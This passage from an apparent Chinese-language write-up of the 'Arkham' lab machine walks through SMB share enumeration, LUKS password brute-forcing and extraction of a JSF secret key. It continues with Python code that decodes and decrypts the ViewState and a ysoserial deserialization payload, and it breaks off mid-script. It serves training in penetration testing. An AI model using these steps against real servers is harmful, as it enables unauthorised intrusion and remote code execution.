+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>=====================================================
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>/images (Status: 302)
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>/css (Status: 302)
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>/js (Status: 302)
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>/fonts (Status: 302)
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>=====================================================
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>...
+</code></pre></div>
+<p>也没有发现什么有用的目录，查看网站可以在订阅中发现一个交互点.<code>http://10.10.10.130:8080/userSubscribe.faces</code></p>
+<p><img alt="截图" src="7faf2a4bdbac8523a9a2ab327190b9c4.png" /></p>
+<p>输入 mac 会给你一个返回信息</p>
+<p><img alt="截图" src="64290ccb8a5ca1ade328eb9d3fef7af4.png" /></p>
+<h2 id="smb-tcp-445">SMB - TCP 445<a class="headerlink" href="#smb-tcp-445" title="Permanent link">&para;</a></h2>
+<p>使用 smbclient 查看当前共享</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>root@kali# smbclient -N -L //10.10.10.130
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>        Sharename       Type      Comment
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>        ---------       ----      -------
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>        ADMIN$          Disk      Remote Admin
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        BatShare        Disk      Master Wayne&#39;s secrets
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        C$              Disk      Default share
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>        IPC$            IPC       Remote IPC
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>        Users           Disk
+</code></pre></div>
+<p>也可以使用 smbmap 进行扫描，但是获取到的信息并没有很多</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>root@kali# smbmap -H 10.10.10.130
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>[+] IP: 10.10.10.130:445        Name: 10.10.10.130                                      
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>        Disk                                                    Permissions
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>        ----                                                    -----------
+</code></pre></div>
+<p>查看 Users 共享,BatShare 共享</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>root@kali# smbclient -N //10.10.10.130/users
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Try &quot;help&quot; to get a list of possible commands.
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>smb: \&gt; dir
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  .                                  DR        0  Sun Feb  3 08:24:10 2019
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>  ..                                 DR        0  Sun Feb  3 08:24:10 2019
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>  Default                           DHR        0  Thu Jan 31 21:49:06 2019
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>  Guest                               D        0  Sun Feb  3 08:24:19 2019
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>root@kali# smbclient -N //10.10.10.130/batshare
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Try &quot;help&quot; to get a list of possible commands.
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>smb: \&gt; dir
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>  .                                   D        0  Sun Feb  3 08:00:10 2019
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>  ..                                  D        0  Sun Feb  3 08:00:10 2019
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>                5158399 blocks of size 4096. 2108668 blocks available
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>smb: \&gt; get appserver.zip
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>getting file \appserver.zip of size 4046695 as appserver.zip (1078.9 KiloBytes/sec) (average 1078.9 KiloBytes/sec)
+</code></pre></div>
+<p>Users 中只存放了一些默认用户和访客用户的文件，而 BatShare 中包含了一个压缩包appserver.zip同时将其下载下来.</p>
+<h2 id="luks-image">LUKS Image<a class="headerlink" href="#luks-image" title="Permanent link">&para;</a></h2>
+<p>解压zip,其中包含一个文本和一个加密的磁盘映像.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>root@kali# unzip appserver.zip
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Archive:  appserver.zip
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  inflating: IMPORTANT.txt
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  inflating: backup.img
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>root@kali# cat IMPORTANT.txt
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn&#39;t have unauthenticated access to it. - Bruce                                                                        
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>root@kali# file backup.img
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</code></pre></div>
+<blockquote>
+<p>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce                                                                        </p>
+<p>Alfred，这是我们linux服务器的备份映像。请注意，小丑或其他任何人都没有未经验证的访问权限。-布鲁斯</p>
+</blockquote>
+<h3 id="luks">暴力破解 Luks 密码<a class="headerlink" href="#luks" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>LUKS（Linux 统一密钥设置(Linux Unified Key Setup)）是一个用于Linux系统上磁盘加密的标准。Luks允许用户在硬盘或分区级别上加密数据，并且只有在提供了正确的解密密钥后才能访问数据。使用 <strong><em><u>bruteforce-luks</u></em></strong> 对密码进行爆破.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>root@kali# grep batman /usr/share/wordlists/rockyou.txt &gt;  test.txt
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>root@kali# apt install bruteforce-luks
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>root@kali# bruteforce-luks -t 10 -f test.txt backup.img -v 60
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>...
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Tried passwords: 40
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>Tried passwords per second: 1.333333
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Last tried password: batman27
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>Tried passwords: 60
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>Tried passwords per second: 1.395349
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>Last tried password: batman82
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>Password found: batmanforever
+</code></pre></div>
+<blockquote>
+<p>-t 10   使用 10 个线程</p>
+<p>-f test.txt  要尝试的密码列表</p>
+<p>-v 60  每 60 秒打印一次进度</p>
+</blockquote>
+<p>成功跑出密码为：batmanforver</p>
+<h3 id="mount">Mount<a class="headerlink" href="#mount" title="Permanent link">&para;</a></h3>
+<p>使用 cryptsetup 打开文件</p>
+<blockquote>
+<p>Cryptsetup 是一个用于管理 Linux 系统上加密设备的命令行工具。它是基于 Device Mapper（设备映射）技术的，能够与 LUKS（Linux Unified Key Setup）卷、TrueCrypt 和 dm-crypt 等加密技术进行交互。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>root@kali# cryptsetup open --type luks backup.img arkham
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Enter passphrase for backup.img:
+</code></pre></div>
+<p>完成后，屏幕上不会显示任何内容，但有一个新设备可用，查看驱动发现一个新设备</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>root@kali# ls -l /dev/mapper/
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>total 0
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>lrwxrwxrwx 1 root root       7 Aug  5 02:11 arkham -&gt; ../dm-0
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>crw------- 1 root root 10, 236 Aug  5 02:11 control
+</code></pre></div>
+<p>挂载新设备到 arkham 目录下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@kali# mount /dev/mapper/arkham /mnt/arkham/
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>root@kali# ls /mnt/arkham/
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>lost+found  Mask
+</code></pre></div>
+<h3 id="_2">文件枚举<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>root@kali# find /mnt/arkham/ -type f
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>/mnt/arkham/Mask/robin.jpeg
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>/mnt/arkham/Mask/docs/Batman-Begins.pdf
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>/mnt/arkham/Mask/me.jpg
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>/mnt/arkham/Mask/joker.png
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>/mnt/arkham/Mask/tomcat-stuff/web.xml.bak
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>/mnt/arkham/Mask/tomcat-stuff/web.xml
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>/mnt/arkham/Mask/tomcat-stuff/server.xml
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>/mnt/arkham/Mask/tomcat-stuff/tomcat-users.xml
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>/mnt/arkham/Mask/tomcat-stuff/jaspic-providers.xml
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>/mnt/arkham/Mask/tomcat-stuff/context.xml
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>/mnt/arkham/Mask/tomcat-stuff/faces-config.xml
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>/mnt/arkham/Mask/tomcat-stuff/MANIFEST.MF
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>/mnt/arkham/Mask/mycar.jpg
+</code></pre></div>
+<p>其中包括蝙蝠侠的图片和 tomcat-stuff 文件夹，通过对其中各个文件的筛查，我们在 web.xml.bak 中发现了有趣的东西。</p>
+<p><img alt="截图" src="1f84c355cb2c734830e5aed5e20268ed.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a> 1 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a> ...
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a> 14 &lt;servlet&gt;
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a> 15 &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a> 16 &lt;servlet-class&gt;javax.faces.webapp.FacesServlet&lt;/servlet-class&gt;
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a> 17 &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a> 18 &lt;/servlet&gt;
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a> 19 &lt;servlet-mapping&gt;
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a> 20 &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a> 21 &lt;url-pattern&gt;*.faces&lt;/url-pattern&gt;
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a> 22 &lt;/servlet-mapping&gt;
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a> 23 &lt;context-param&gt;
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a> 24 &lt;param-name&gt;javax.servlet.jsp.jstl.fmt.localizationContext&lt;/param-name&gt;
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a> 25 &lt;param-value&gt;resources.application&lt;/param-value&gt;
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a> 26 &lt;/context-param&gt;
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a> 27 &lt;context-param&gt;
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a> 28 &lt;description&gt;State saving method: &#39;client&#39; or &#39;server&#39; (=default). See JSF Specification 2.5.2&lt;/description&gt;
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a> 29 &lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a> 30 &lt;param-value&gt;server&lt;/param-value&gt;
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a> 31 &lt;/context-param&gt;
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a> 32 &lt;context-param&gt;
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a> 33 &lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a> 34 &lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a> 35 &lt;/context-param&gt;
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a> 36     &lt;context-param&gt;
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a> 37         &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;
+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a> 38         &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a> 39      &lt;/context-param&gt;
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a> 40 &lt;context-param&gt;
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a> 41 &lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a> 42 &lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a> 43 &lt;/context-param&gt;
+<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a> ...
+</code></pre></div>
+<p>根据以上配置文件我们可以得到以下信息</p>
+<ul>
+<li>JSF 版本为 2.5.2</li>
+<li>该站点会匹配 *.faces 来调用 servlet</li>
+<li>myfaces 的 SECRET 为 SnNGOTg3Ni0=，HmacSHA1 的 SECRET 为 SnNGOTg3Ni0=，SnNGOTg3Ni0= 经过解码后为 JsF9876-</li>
+</ul>
+<h1 id="_3">漏洞利用与检测<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<h2 id="jsf-viewstate">JSF ViewState反序列化漏洞<a class="headerlink" href="#jsf-viewstate" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>JSF 框架主要使用序列化来保持站点的状态，它会帮助服务器序列化一个 Java 对象，并将其作为网页中的隐藏字段发送到客户端，当客户端提交时该序列化对象被发送回服务器，服务器可以使用它来取回状态。反序列化漏洞是允许用户提交序列化对象，如果序列化对象包含恶意代码，那么在反序列化过程中就会运行。从而用户可以控制输入来获取执行权限。</p>
+</blockquote>
+<p>如何验证是否存在ViewState反序列化漏洞？</p>
+<blockquote>
+<p>1、测试<strong>提交错误的 ViewState</strong> 会发生什么？
+2、<strong>解密 ViewState</strong> 变量来显示我的加密密钥有效
+3、<strong>构建脚本加密好的 ViewState</strong> 并进行提交
+4、使用<strong> ysoserial </strong>来生成 payload，它可以使用脚本中的 ViewState 来 ping 主机
+5、更新 payload 获取<strong>反弹shell</strong></p>
+</blockquote>
+<p>找到之前的订阅栏目，使用 BurpSuite 将数据包拦截，具体数据包如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>POST /userSubscribe.faces HTTP/1.1
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Host: 10.10.10.130:8080
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Accept-Language: en-US,en;q=0.5
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Referer: http://10.10.10.130:8080/userSubscribe.faces
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>Content-Type: application/x-www-form-urlencoded
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>Content-Length: 261
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>Cookie: JSESSIONID=D8A54B3871DBBA43CBCBA95A59D6F643
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>Connection: close
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>Upgrade-Insecure-Requests: 1
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>j_id_jsp_1623871077_1%3Aemail=0xdf&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RXtNO1NI%2FGme70KtDtngjDm0mNzA9qHjYerxo
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>0jW7zu1DWIHlJqY3Fedt5UA7dKm1%2FZ7jZk%3D
+</code></pre></div>
+<p>将 javax.faces.ViewState 参数的值的第一个字符从 w 字符修改为 W 字符，查看页面报错信息</p>
+<p><img alt="截图" src="8ceef31ab4f243422b28e6120c27cf93.png" /></p>
+<h2 id="viewstate">ViewState解码<a class="headerlink" href="#viewstate" title="Permanent link">&para;</a></h2>
+<p>我们可以抓取到 javax.faces.ViewState 参数的值如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0j
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>W7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
+</code></pre></div>
+<p>通过 python 代码来获取其中的字节流</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>from base64 import b64decode
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>from urllib.parse import unquote_plus as urldecode
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>vs = &#39;wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D&#39;
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>vs_urldecode = urldecode(vs)
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>print(vs_urldecode)
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>vs_bs64decode = b64decode(vs_urldecode)
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>print(vs_bs64decode)
+</code></pre></div>
+<p><img alt="截图" src="a2c8baa03fb3b7521cb22741ad851887.png" /></p>
+<p>这是加密的字节流，我们需要通过解密来获取其中的信息。SHA1的长度通常为20字节，很可能附加到首位或末尾。经过测试 HMAC 存储在最后20字节中</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>from base64 import b64decode
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>from urllib.parse import unquote_plus as urldecode
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>from hashlib import sha1  # 导入 hashlib 模块中的 sha1 哈希函数
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>import hmac  # 导入 hmac 模块，用于计算 HMAC
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>vs = &#39;wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D&#39;
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>vs_urldecode = urldecode(vs)  # 对字符串进行 URL 解码
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>vs_bs64decode = b64decode(vs_urldecode)  # 对 URL 解码后的字符串进行 Base64 解码
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>mac = vs_bs64decode[-20:]  # 获取数据的 MAC（消息验证码）
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>enc = vs_bs64decode[:-20]  # 获取数据的内容
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>enc_hmac = hmac.new(b&#39;JsF9876-&#39;, enc, sha1).digest()  # 计算数据内容的 HMAC（基于哈希的消息认证码）
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>print(mac)  # 输出数据的 MAC（消息验证码）
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>print(enc_hmac)  # 输出计算得到的数据内容的 HMAC
+</code></pre></div>
+<p><img alt="截图" src="171137fbe9dcc733c52a887b7cef720a.png" /></p>
+<p>目前已知加密方式、加密位置以及密钥，接下来就可以解密这串值</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>from base64 import b64decode
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>from urllib.parse import unquote_plus as urldecode
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>from Crypto.Cipher import DES  # 导入 Crypto.Cipher 模块中的 DES 加密算法
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>vs = &#39;wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D&#39;
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>vs_urldecode = urldecode(vs)
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>vs_bs64decode = b64decode(vs_urldecode)
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>enc = vs_bs64decode[:-20]   # 获取数据的密文（除了最后 20 个字节之外的部分）
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>d = DES.new(b&#39;JsF9876-&#39;, DES.MODE_ECB)  # 使用 DES 算法和 ECB 模式创建一个 DES 对象，用于解密
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>print(d.decrypt(enc))
+</code></pre></div>
+<p><img alt="截图" src="02f81d0dbc416715bc91d057d980f867.png" /></p>
+<p>经过解密后出现字符串说明解密确实是正确的.</p>
+<h2 id="ysoserial">ysoserial<a class="headerlink" href="#ysoserial" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>ysoserial是一个用于生成java反序列化有效负载的项目。最早在2015年Marshalling Pickles: how deserializing objects will destroy your会议上提出的一个工具，该工具包含各种java反序列化利用链，可直接生成序列化数据文件，也可通过交互式开启各种服务。总之，提到java反序列化一定会有ysoserial工具的出现，通过该工具直接快速生成java反序列化漏洞的有效负载.</p>
+<p>下载链接：https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar</p>
+</blockquote>
+<p>使用 ysoserial 来生成 ping 命令的 payload。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>java -jar ./ysoserial.jar BeanShell1 &#39;ping 10.10.14.14&#39; &gt; text
+</code></pre></div>
+<p><img alt="截图" src="9628690a353c4c55d8f30f8b90afe108.png" /></p>
+<p>生成成功，但是我需要将其放入 python 脚本当中进行调用.</p>
+<p>安装模块 pip install pycryptodome.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>import requests
